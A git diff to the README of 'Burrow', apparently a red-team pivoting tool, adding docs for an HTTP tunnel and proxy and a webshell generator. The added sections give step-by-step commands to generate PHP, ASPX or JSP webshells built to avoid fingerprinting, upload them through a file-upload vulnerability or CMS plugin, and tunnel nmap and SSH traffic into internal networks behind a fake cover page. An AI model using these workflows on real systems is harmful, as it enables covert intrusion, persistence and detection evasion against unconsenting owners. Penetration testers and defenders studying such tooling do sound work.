@@ -44,6 +44,7 @@ Select transport with `--transport <name>` on both server and agent. Both sides 
 | WebSocket | `ws` | HTTP/HTTPS upgrade protocol. | Firewall evasion. Traffic looks like normal HTTPS. |
 | DNS tunnel | `dns` | Encodes traffic in DNS queries/responses. | Restrictive networks where only DNS egress is allowed. |
 | ICMP tunnel | `icmp` | Encodes traffic in ICMP echo payloads. | Networks where only ping is allowed. Requires raw socket privileges. |
+| HTTP | `http` | HTTP polling. Traffic encoded as HTTP request/response pairs. Server provides a fake HTML cover page on GET /. | Restrictive networks where only HTTP/HTTPS egress is allowed. Works through web proxies and WAFs. |
 
 ## Commands Reference
 
@@ -330,6 +331,201 @@ Configure tools to use the proxy:
 curl --socks5 127.0.0.1:1080 http://10.0.0.5/
 proxychains nmap -sT 10.0.0.0/24
 ```
+
+---
+
+### `burrow proxy http`
+
+Forward HTTP proxy server with CONNECT support. Handles both HTTP CONNECT tunneling (for HTTPS) and regular HTTP request forwarding. Supports optional Basic auth.
+
+The proxy includes a Dialer hook for session routing. When used with an agent session, traffic routes through the yamux session to internal networks rather than the local network stack.
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--listen, -l` | `127.0.0.1:8080` | Listen address (host:port) |
+| `--auth` | | Authentication credentials as `user:pass` |
+
+**Examples:**
+
+```bash
+# Basic HTTP proxy
+burrow proxy http
+
+# Custom listen address
+burrow proxy http --listen 127.0.0.1:3128
+
+# With Basic auth
+burrow proxy http --listen 127.0.0.1:8080 --auth operator:s3cr3t
+```
+
+**Expected output:**
+
+```
+[*] HTTP proxy listening on 127.0.0.1:8080
+[+] CONNECT 10.0.0.5:443 from 127.0.0.1:54321 (512 bytes transferred)
+[+] GET http://internal.host/api from 127.0.0.1:54322 -> 200 OK (1024 bytes)
+[*] Shutting down. Total connections: 5, bytes transferred: 92140
+```
+
+Configure tools to use the proxy:
+
+```bash
+# curl with HTTP proxy
+curl -x http://127.0.0.1:8080 http://internal.host/
+
+# Environment variable for tools that respect HTTP_PROXY
+HTTP_PROXY=http://127.0.0.1:8080 wget http://internal/
+
+# With auth
+curl -x http://operator:s3cr3t@127.0.0.1:8080 http://internal.host/
+```
+
+---
+
+### `burrow httptunnel server`
+
+reGeorg-style HTTP tunnel server. Runs on the target machine. Accepts inbound HTTP POST requests from the attacker and relays TCP connections to internal hosts. Serves a fake "It works!" HTML cover page on GET / to blend in with normal web traffic.
+
+This solves the egress-blocked scenario: the target has no outbound connectivity, but the attacker can reach the target's HTTP port. The server listens for HTTP requests and acts as a relay, so all pivoting traffic flows inbound from the attacker's perspective.
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--listen, -l` | `0.0.0.0:8080` | Listen address (host:port) |
+| `--key` | | Shared encryption/authentication key (enables XOR encryption + SHA256 X-Token auth) |
+| `--path` | `/b` | URL path for the tunnel endpoint |
+
+**Examples:**
+
+```bash
+# Basic HTTP tunnel server (no encryption)
+burrow httptunnel server --listen 0.0.0.0:8080
+
+# With encryption and authentication
+burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret
+
+# Custom path (blend in with existing app routes)
+burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret --path /api/health
+```
+
+**Expected output:**
+
+```
+[*] HTTP tunnel server listening on 0.0.0.0:8080 (path: /b)
+[+] New tunnel connection from 203.0.113.5
+[+] CONNECT 10.0.0.20:22 (session: a1b2c3)
+[-] Session a1b2c3 disconnected
+```
+
+**Protocol details:**
+
+The tunnel uses a simple HTTP-based protocol with 5 commands: `connect`, `send`, `recv`, `disconnect`, and `ping`. Each request carries a session ID. When `--key` is set, payloads are XOR-encrypted and base64-encoded, and each request must include a valid SHA256 HMAC `X-Token` header. Without a key, traffic is plaintext base64.
+
+---
+
+### `burrow httptunnel client`
+
+HTTP tunnel client providing a local SOCKS5 proxy interface. Runs on the attacker machine. All SOCKS5 traffic is tunneled through HTTP POST requests to the server. Point your tools at the local SOCKS5 port and traffic flows through the HTTP tunnel to the target network.
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--url` | (required) | HTTP tunnel server URL (e.g. `http://target:8080/b`) |
+| `--socks` | `127.0.0.1:1080` | Local SOCKS5 listen address |
+| `--key` | | Shared encryption/authentication key (must match server) |
+
+**Examples:**
+
+```bash
+# Connect to a running httptunnel server
+burrow httptunnel client --url http://target:8080/b
+
+# With encryption (key must match server)
+burrow httptunnel client --url http://target:8080/b --key s3cret
+
+# Custom local SOCKS5 port
+burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0.1:9050
+```
+
+**Expected output:**
+
+```
+[*] HTTP tunnel client -> http://target:8080/b
+[*] SOCKS5 proxy listening on 127.0.0.1:1080
+[+] SOCKS5 CONNECT 10.0.0.20:22 -> tunneling via HTTP
+[+] Session established: a1b2c3
+```
+
+**Full workflow (both sides):**
+
+```bash
+# On target (no outbound connectivity needed):
+burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret
+
+# On attacker:
+burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0.1:1080
+
+# Now route tools through the SOCKS5 proxy:
+proxychains ssh user@10.0.0.20
+proxychains curl http://10.0.0.30/admin
+```
+
+---
+
+### `burrow generate webshell`
+
+Generate HTTP tunnel webshells (PHP, ASPX, or JSP) that implement the same protocol as `burrow httptunnel server`. Deploy the generated file to the target's web root, then connect with `burrow httptunnel client`. Useful when you can upload files to a web server but can't deploy a binary.
+
+Generated webshells contain no identifying comments and no hardcoded strings that would fingerprint them as Burrow-related. The key is embedded at generation time.
+
+**Flags:**
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--format, -f` | (required) | Webshell format: `php`, `aspx`, or `jsp` |
+| `--key, -k` | (required) | Shared encryption/authentication key (embedded in the webshell) |
+| `--output, -o` | stdout | Output file path |
+
+**Examples:**
+
+```bash
+# Generate a PHP webshell
+burrow generate webshell --format php --key s3cret -o tunnel.php
+
+# Generate an ASPX webshell
+burrow generate webshell --format aspx --key s3cret -o tunnel.aspx
+
+# Generate a JSP webshell
+burrow generate webshell --format jsp --key s3cret -o tunnel.jsp
+
+# Print to stdout (pipe or inspect)
+burrow generate webshell --format php --key s3cret
+```
+
+**Workflow: generate, upload, connect:**
+
+```bash
+# Step 1: Generate the webshell on the attacker machine
+burrow generate webshell --format php --key s3cret -o tunnel.php
+
+# Step 2: Upload tunnel.php to the target web root
+# (via file upload vulnerability, FTP, SCP, CMS plugin, etc.)
+
+# Step 3: Connect with httptunnel client
+burrow httptunnel client --url http://target/tunnel.php --key s3cret --socks 127.0.0.1:1080
+
+# Step 4: Route tools through the SOCKS5 proxy
+proxychains nmap -sT -Pn 10.10.10.0/24
+proxychains curl http://10.10.10.5/internal-api
+```
+
+**Security notes:**
+
+Webshells are generated without any identifying comments, author strings, or tool-specific markers. The key is embedded as a derived constant so the raw key string does not appear in the file. Each generated file is functionally identical to a hand-written implementation of the protocol.
 
 ---
 
@@ -690,6 +886,29 @@ curl --socks5 127.0.0.1:1080 http://10.0.0.5/admin
 proxychains nmap -sT -p 22,80,443 10.0.0.0/24
 ```
 
+### HTTP Tunnel Through Egress-Blocked Host
+
+```bash
+# Scenario: Target has no outbound connectivity, but you can reach port 8080
+
+# Option A: Deploy Burrow binary on target
+# On target:
+burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret
+
+# On attacker:
+burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0.1:1080
+proxychains nmap -sT -Pn 10.10.10.0/24
+
+# Option B: Upload a webshell instead of a binary
+# On attacker:
+burrow generate webshell --format php --key s3cret -o tunnel.php
+# Upload tunnel.php to target web root
+
+# On attacker:
+burrow httptunnel client --url http://target/tunnel.php --key s3cret --socks 127.0.0.1:1080
+proxychains nmap -sT -Pn 10.10.10.0/24
+```
+
 ---
 
 ### Complete Multi-Hop Pivot Workflow
@@ -868,9 +1087,11 @@ Dependencies: click, rich, pyyaml, pydantic, cryptography, fastapi, uvicorn.
 ```
 cmd/burrow/cmd/          CLI (cobra)
 internal/
-  transport/             Transport interface + registry (raw, ws, dns, icmp)
+  transport/             Transport interface + registry (raw, ws, dns, icmp, http)
   crypto/                X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM
-  proxy/                 SOCKS5 server (RFC 1928) + session routing
+  proxy/                 SOCKS5 + HTTP forward proxy with session routing
+  httptunnel/            reGeorg-style HTTP tunnel (server + client + protocol)
+    webshell/            Webshell generator (PHP/ASPX/JSP templates)
   tunnel/                Local, remote, and reverse TCP forwarders
   relay/                 Socat-style bidirectional relay
   pivot/                 Multi-hop chain orchestration
@@ -920,7 +1141,7 @@ Max payload: 1 MB. All structured payloads are JSON-encoded.
 ~/go1.24/go/bin/go test ./...
 ```
 
-21 packages, all passing.
+24 packages, all passing.
 
 ---
 
